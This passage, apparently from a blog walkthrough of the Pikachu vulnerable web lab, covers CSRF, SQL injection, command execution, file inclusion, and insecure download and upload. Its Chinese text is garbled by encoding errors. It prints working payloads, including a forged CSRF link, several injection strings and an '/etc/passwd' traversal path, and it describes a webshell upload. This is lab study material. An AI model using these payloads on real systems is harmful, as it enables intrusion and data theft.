æ¬ºéª—å°ç™½è®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬ï¼ˆç›—å–cookieçš„è„šæœ¬ï¼‰çš„é¡µé¢ï¼Œå°ç™½ä¸­æ‹›ï¼Œå°é»‘æ‹¿åˆ°å°ç™½çš„cookieï¼Œç„¶åå°é»‘é¡ºåˆ©ç™»å½•åˆ°å°ç™½çš„åå°ï¼Œå°é»‘è‡ªå·±ä¿®æ”¹å°ç™½çš„ç›¸å…³ä¿¡æ¯ã€‚</span><br><span class="line">---æ‰€ä»¥è·Ÿä¸Šé¢æ¯”ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹å‡ºCSRFä¸XSSçš„åŒºåˆ«ï¼šCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚</span><br><span class="line">å› æ­¤ï¼Œç½‘ç«™å¦‚æœè¦é˜²æ­¢CSRFæ”»å‡»ï¼Œåˆ™éœ€è¦å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å¯¹åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²æ­¢è¿™äº›æ“ä½œå‡ºç°è¢«ä¼ªé€ çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´CSRFã€‚æ¯”å¦‚ï¼š</span><br><span class="line">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›</span><br><span class="line">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›</span><br><span class="line">--å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="01-CSRF-get"><a href="#01-CSRF-get" class="headerlink" title="01.CSRF(get)"></a>01.CSRF(get)</h3><p><code>liliç™»å…¥ï¼Œgetä¼ å‚</code></p>
<img src="/2021/04/28/Pikachu/image-20210426134446159.png" class>

<p><code>ä¼ªé€ è¿æ¥è®©kobeç‚¹å‡»</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://81.70.195.159:8001/vul/csrf/csrfget/csrf_get_edit.php?sex=demo&amp;phonenum=110&amp;add=demo&amp;email=demo%40qq.com&amp;submit=submit</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210426134739431.png" class>

<h3 id="02-CSRF-post"><a href="#02-CSRF-post" class="headerlink" title="02.CSRF(post)"></a>02.CSRF(post)</h3><p><code>è¿™å›ç”¨kobeæ¬ºéª—lili</code></p>
<img src="/2021/04/28/Pikachu/image-20210426135921623.png" class>

<p><code>ç”ŸæˆPOCï¼Œè®©liliç‚¹</code></p>
<img src="/2021/04/28/Pikachu/image-20210426140028390.png" class>

<p><code>liliç™»å…¥ï¼Œliliç‚¹å‡»</code></p>
<img src="/2021/04/28/Pikachu/image-20210426140224883.png" class>

<p><code>ä¿®æ”¹æˆåŠŸ</code></p>
<img src="/2021/04/28/Pikachu/image-20210426140321498.png" class>

<h3 id="03-CSRF-token"><a href="#03-CSRF-token" class="headerlink" title="03.CSRF token"></a>03.CSRF token</h3><p><code>æŸ¥çœ‹æºç </code></p>
<h2 id="0x04-Sql-Inject"><a href="#0x04-Sql-Inject" class="headerlink" title="0x04.Sql Inject"></a>0x04.Sql Inject</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    åœ¨owaspå‘å¸ƒçš„top10æ’è¡Œæ¦œé‡Œï¼Œæ³¨å…¥æ¼æ´ä¸€ç›´æ˜¯å±å®³æ’åç¬¬ä¸€çš„æ¼æ´ï¼Œå…¶ä¸­æ³¨å…¥æ¼æ´é‡Œé¢é¦–å½“å…¶å†²çš„å°±æ˜¯æ•°æ®åº“æ³¨å…¥æ¼æ´ã€‚</span><br><span class="line">    </span><br><span class="line">ä¸€ä¸ªä¸¥é‡çš„SQLæ³¨å…¥æ¼æ´ï¼Œå¯èƒ½ä¼šç›´æ¥å¯¼è‡´ä¸€å®¶å…¬å¸ç ´äº§ï¼</span><br><span class="line">SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œ</span><br><span class="line">å¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ </span><br><span class="line">ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚</span><br><span class="line">åœ¨æ„å»ºä»£ç æ—¶ï¼Œä¸€èˆ¬ä¼šä»å¦‚ä¸‹å‡ ä¸ªæ–¹é¢çš„ç­–ç•¥æ¥é˜²æ­¢SQLæ³¨å…¥æ¼æ´ï¼š</span><br><span class="line">1.å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ï¼›</span><br><span class="line">2.ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼›</span><br><span class="line">3.è¿˜æœ‰å°±æ˜¯,ç›®å‰æœ‰å¾ˆå¤šORMæ¡†æ¶ä¼šè‡ªåŠ¨ä½¿ç”¨å‚æ•°åŒ–è§£å†³æ³¨å…¥é—®é¢˜,ä½†å…¶ä¹Ÿæä¾›äº†&quot;æ‹¼æ¥&quot;çš„æ–¹å¼,æ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦æ…é‡!</span><br></pre></td></tr></table></figure>

<h3 id="01-æ•°å­—å‹æ³¨å…¥-post"><a href="#01-æ•°å­—å‹æ³¨å…¥-post" class="headerlink" title="01.æ•°å­—å‹æ³¨å…¥(post)"></a>01.æ•°å­—å‹æ³¨å…¥(post)</h3><p><code>ä¸€å…±ä¸¤ä¸ªå­—æ®µï¼Œçˆ†è¡¨çˆ†å­—æ®µä¸åœ¨èµ˜è¿°</code></p>
<img src="/2021/04/28/Pikachu/image-20210427091648529.png" class>

<h3 id="02-å­—ç¬¦å‹æ³¨å…¥-get"><a href="#02-å­—ç¬¦å‹æ³¨å…¥-get" class="headerlink" title="02.å­—ç¬¦å‹æ³¨å…¥(get)"></a>02.å­—ç¬¦å‹æ³¨å…¥(get)</h3><p><code>é—­åˆå•å¼•å·</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27; or &#x27;1&#x27;=&#x27;1&amp;submit=æŸ¥è¯¢</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427092111715.png" class>

<h3 id="03-æœç´¢å‹æ³¨å…¥"><a href="#03-æœç´¢å‹æ³¨å…¥" class="headerlink" title="03.æœç´¢å‹æ³¨å…¥"></a>03.æœç´¢å‹æ³¨å…¥</h3><p><code>ç›´æ¥è¾“å…¥%%å³å¯ï¼Œ%%è¡¨ç¤ºæŸ¥è¯¢åˆ—æœ‰ä¸ä¸ºnullçš„å…¨éƒ¨å€¼</code></p>
<img src="/2021/04/28/Pikachu/image-20210427092429147.png" class>

<h3 id="04-xxå‹æ³¨å…¥"><a href="#04-xxå‹æ³¨å…¥" class="headerlink" title="04.xxå‹æ³¨å…¥"></a>04.xxå‹æ³¨å…¥</h3><p><code>é—­åˆå­—ç¬¦ä¸º&#39;) åŒç¬¬ä¸€é¢˜</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1/vul/sqli/sqli_str.php?name=admin&#x27;) or 1=1 -- -&amp;submit=æŸ¥è¯¢</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427092840466.png" class>

<h3 id="05-insert-updateæ³¨å…¥"><a href="#05-insert-updateæ³¨å…¥" class="headerlink" title="05.insert/updateæ³¨å…¥"></a>05.insert/updateæ³¨å…¥</h3><p><code>æ³¨å†Œç‚¹å­˜åœ¨æ³¨å…¥</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">username=admon&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427102044309.png" class>

<h3 id="06-deleteæ³¨å…¥"><a href="#06-deleteæ³¨å…¥" class="headerlink" title="06.deleteæ³¨å…¥"></a>06.deleteæ³¨å…¥</h3><p><code>åŒä¸Š</code></p>
<img src="/2021/04/28/Pikachu/image-20210427103706046.png" class>

<h3 id="07-http-header-æ³¨å…¥"><a href="#07-http-header-æ³¨å…¥" class="headerlink" title="07.http header æ³¨å…¥"></a>07.http header æ³¨å…¥</h3><p><code>æ³¨å…¥ç‚¹ä¸ºuser-agent/cookie</code></p>
<img src="/2021/04/28/Pikachu/image-20210427105308987.png" class>

<h3 id="08-ç›²æ³¨-base-boolian"><a href="#08-ç›²æ³¨-base-boolian" class="headerlink" title="08.ç›²æ³¨(base boolian)"></a>08.ç›²æ³¨(base boolian)</h3><p><code>é€å­—çˆ†ç ´æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºp</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and left((select database()),1)=&#x27;a&#x27;-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427111803637.png" class>

<h3 id="09-ç›²æ³¨-base-time"><a href="#09-ç›²æ³¨-base-time" class="headerlink" title="09.ç›²æ³¨(base time)"></a>09.ç›²æ³¨(base time)</h3><p><code>è¾“å…¥ä»€ä¹ˆéƒ½åªæœ‰ä¸€ä¸ªå›æ˜¾</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())=7,sleep(5),1)-- -</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427112355990.png" class>

<h3 id="10-å®½å­—èŠ‚æ³¨å…¥"><a href="#10-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="10.å®½å­—èŠ‚æ³¨å…¥"></a>10.å®½å­—èŠ‚æ³¨å…¥</h3><blockquote>
<p>payload</p>
<p>kobe%e0â€™ or 1=1 â€“ -</p>
</blockquote>
<img src="/2021/04/28/Pikachu/image-20210427151329767.png" class>

<h2 id="0x05-RCE"><a href="#0x05-RCE" class="headerlink" title="0x05.RCE"></a>0x05.RCE</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RCE(remote command/code execute)æ¦‚è¿°RCEæ¼æ´ï¼Œ</span><br><span class="line">å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œ</span><br><span class="line">ä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œ</span><br><span class="line">æ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œ</span><br><span class="line">ç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ </span><br><span class="line">è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œ</span><br><span class="line">åˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œ</span><br><span class="line">ä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡&quot;è‡ªåŠ¨åŒ–è¿ç»´å¹³å°&quot;è¿›è¡Œæ“ä½œã€‚ </span><br><span class="line">åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,</span><br><span class="line">ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„&quot;æ”¶è·&quot;-_-è¿œç¨‹ä»£ç æ‰§è¡ŒåŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,</span><br><span class="line">åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ </span><br><span class="line">ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚</span><br><span class="line">å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œ</span><br><span class="line">ä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="01-exec-ping"><a href="#01-exec-ping" class="headerlink" title="01.exec(ping)"></a>01.exec(ping)</h3><p><code>ç®€å•çš„å‘½ä»¤æ‰§è¡Œ</code></p>
<img src="/2021/04/28/Pikachu/image-20210427152244048.png" class>

<h2 id="02-exec-eval"><a href="#02-exec-eval" class="headerlink" title="02.exec(eval)"></a>02.exec(eval)</h2><p><code>å“åº”phpä»£ç </code></p>
<img src="/2021/04/28/Pikachu/image-20210427152552241.png" class>

<h2 id="0x06-æ–‡ä»¶åŒ…å«"><a href="#0x06-æ–‡ä»¶åŒ…å«" class="headerlink" title="0x06.æ–‡ä»¶åŒ…å«"></a>0x06.æ–‡ä»¶åŒ…å«</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">File Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)æ¦‚è¿°æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚</span><br><span class="line">åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œ</span><br><span class="line">å…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚ </span><br><span class="line">æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼šinclude(),include_once()require(),require_once()è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œ</span><br><span class="line">è¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚</span><br><span class="line">å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ </span><br><span class="line">ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œ</span><br><span class="line">è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ </span><br><span class="line">æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚ </span><br><span class="line">æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œ</span><br><span class="line">æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š</span><br><span class="line">1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œ</span><br><span class="line">ç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œ</span><br><span class="line">æ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº› å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚</span><br><span class="line">å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚</span><br><span class="line">2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼šèƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œ</span><br><span class="line">è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚</span><br><span class="line">å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œ</span><br><span class="line">å¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="01-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#01-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="01.æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>01.æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><img src="/2021/04/28/Pikachu/image-20210427153823309.png" class>

<h3 id="02-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#02-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="02.è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>02.è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p><code>nothing</code></p>
<h2 id="0x07-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"><a href="#0x07-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x07.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"></a>0x07.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¦‚è¿°æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œ</span><br><span class="line">ä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œ</span><br><span class="line">åå°åœ¨æ”¶åˆ°è¯·æ±‚å ä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚ </span><br><span class="line">å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œ</span><br><span class="line">åˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œ</span><br><span class="line">è€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚../../../etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ </span><br><span class="line">ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œ</span><br><span class="line">å¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±å‰ç«¯ä¼ è¿›æ¥çš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚ </span><br><span class="line">åˆ‡è®°ï¼šæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼</span><br></pre></td></tr></table></figure>

<img src="/2021/04/28/Pikachu/image-20210427170920823.png" class>

<h2 id="0x08-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "><a href="#0x08-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x08.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "></a>0x08.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ </h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¦‚è¿°æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿå¾ˆå¸¸è§ï¼Œ</span><br><span class="line">æ¯”å¦‚å¾ˆå¤šç½‘ç«™æ³¨å†Œçš„æ—¶å€™éœ€è¦ä¸Šä¼ å¤´åƒã€ä¸Šä¼ é™„ä»¶ç­‰ç­‰ã€‚å½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œ</span><br><span class="line">åå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­ æ¯”å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œ</span><br><span class="line">ç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ã€‚ </span><br><span class="line">å¦‚æœè¯´åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œ</span><br><span class="line">åˆ™æ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æ¶æ„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚</span><br><span class="line">æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ã€‚</span><br><span class="line">æ¯”å¦‚ï¼š--éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°;--éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;</span><br><span class="line">--å¯¹æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å;--ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;--ç­‰ç­‰...</span><br></pre></td></tr></table></figure>

<h3 id="01-client-check"><a href="#01-client-check" class="headerlink" title="01.client check"></a>01.client check</h3><p><code>æŠ“åŒ…æ”¹åå³å¯</code></p>
<img src="/2021/04/28/Pikachu/image-20210427172209197.png" class>

<p><code>èšå‰‘è¿æ¥</code></p>
<img src="/2021/04/28/Pikachu/image-20210427172237838.png" class>

<h3 id="02-MIME-type"><a href="#02-MIME-type" class="headerlink" title="02.MIME type"></a>02.MIME type</h3><p><code>æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹å³å¯</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å¸¸è§çš„MIMEç±»å‹è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬</span><br><span class="line">.html,.html text/htmlæ™®é€šæ–‡æœ¬ </span><br><span class="line">.txt text/plainRTFæ–‡æœ¬ </span><br><span class="line">.rtf application/rtfGIFå›¾å½¢ </span><br><span class="line">.gif image/gifJPEGå›¾å½¢ </span><br><span class="line">.ipeg,.jpg image/jpegauå£°éŸ³æ–‡ä»¶ </span><br><span class="line">.au audio/basicMIDIéŸ³ä¹æ–‡ä»¶ </span><br><span class="line">.mid,.midi 